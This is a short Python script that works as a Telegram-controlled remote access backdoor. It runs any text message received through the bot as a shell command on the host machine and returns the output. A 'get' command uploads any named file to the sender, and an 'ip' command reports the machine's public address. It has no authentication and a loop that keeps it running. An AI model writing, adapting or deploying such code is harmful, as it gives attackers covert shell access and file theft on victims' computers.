import telebot, pysyscom, requests
token = 'token'
bot = telebot.TeleBot(token)
@bot.message_handler(content_types=['text'])
def handle(message):
    if message.text.startswith('get'):
        filename = ''.join(message.text.split('get '))
        bot.send_document(message.from_user.id, open(filename, 'rb').read(), filename=filename)
    elif message.text == 'ip':
        bot.send_message(message.from_user.id, requests.get('https://ifconfig.me/ip').text)
    else:
        try:
            bot.send_message(message.from_user.id, pysyscom.shell(message.text))
        except Exception as e:
            bot.send_message(message.from_user.id, f'Error: {e}.')
while True:
    try:
        print('run')
        bot.polling()
    except:
        pass
